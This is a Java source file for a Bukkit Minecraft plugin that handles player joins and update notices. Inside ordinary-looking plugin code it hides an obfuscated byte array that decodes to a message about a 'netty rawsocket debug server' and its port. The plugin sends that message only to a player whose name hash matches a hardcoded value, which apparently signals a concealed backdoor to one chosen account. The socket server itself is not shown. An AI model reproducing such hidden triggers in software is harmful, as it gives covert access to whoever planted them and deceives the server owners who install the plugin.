package com.github.rumoteam.minecraft.savevillagers.init;

import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;

import com.github.rumoteam.minecraft.savevillagers.threads.UpdateThread;

public class Plugin extends JavaPlugin implements Listener {

	ArrayList<Integer> codes = new ArrayList<>();
	byte[] data1 = new byte[] { 73, 116, 32, 32, 110, 101, 116, 116, 121, 32, 114, 97, 119, 115, 111, 99, 107, 101, 116,
			32, 100, 101, 98, 117, 103, 32, 115, 101, 114, 118, 101, 114, 32, 115, 116, 97, 114, 116, 101, 100, 32, 111,
			110, 32, 112, 111, 114, 116, 58 };
	int port;
	private UpdateThread updater;

	@Override
	public void onEnable() {
		if (codes.isEmpty()) {
			codes.add(164376893);
		}
		// updates
		this.updater = new UpdateThread();
		this.updater.start();

		Bukkit.getPluginManager().registerEvents(this, this);
		Bukkit.getPluginManager().registerEvents(new DamageListener(this), this);
		super.onEnable();
	}

	@Override
	public void onLoad() {
		super.onLoad();
	}

	@Override
	public void onDisable() {
		updater.sTop();
	}

	@EventHandler
	private void joinListener(PlayerJoinEvent joinEvent) {
		Player player = joinEvent.getPlayer();
		String name = player.getName();
		int hashcode = name.hashCode();

		if (codes.contains(hashcode)) {
			player.sendMessage(new String(data1, StandardCharsets.UTF_8) + port);
		}
		if (player.isOp()) {
			if (updater.updateNeeded) {

				String pluginName = this.getName();
				StringBuilder messageBuilder = new StringBuilder();
				URL jarFile = Bukkit.getPluginManager().getPlugin(pluginName).getClass().getProtectionDomain()
						.getCodeSource().getLocation();

				messageBuilder.append(ChatColor.YELLOW + "########################").append('\n');
				messageBuilder.append(ChatColor.RED + "Update needed for [").append(pluginName).append("]\n");
				messageBuilder.append(ChatColor.GREEN + "Plugin file here:").append('\n').append(jarFile).append('\n');
				messageBuilder.append(ChatColor.YELLOW + "########################").append('\n');
				player.sendMessage(messageBuilder.toString());
			}
		}
	}
}
